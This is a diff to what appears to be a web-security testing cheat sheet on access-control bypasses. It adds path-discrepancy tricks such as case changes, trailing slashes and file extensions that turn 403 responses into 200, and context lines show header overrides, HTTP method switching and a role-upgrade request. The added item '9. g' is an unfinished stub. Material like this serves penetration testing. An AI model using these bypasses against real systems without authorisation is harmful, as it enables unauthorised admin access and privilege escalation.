@@ -48,6 +48,11 @@
  	X-Original-URL: /admin			200 Access Granted
 	Session: normalusertoken
 	```
+ 	- making use of path discrepancies
+	```
+ 	/admin 	      403 Denied Access >> /ADMIN 	200 Access Granted
+ 	/admin/files 	403 Denied Access >> /admin/files/ 200 	Access Granted
+ 	/admin/deleteUser	403 Unauthorized >> /admin/deleteUser.php	200 Success
  8. bypass unauthorized action using different HTTP method
 	- instead of POST, try GET or PUT
 	```
@@ -60,3 +65,4 @@
   	GET /admin-roles?username=normaluser&action=upgrade		200 Success
   	Session: normalusertoken
   	```
+  9. g
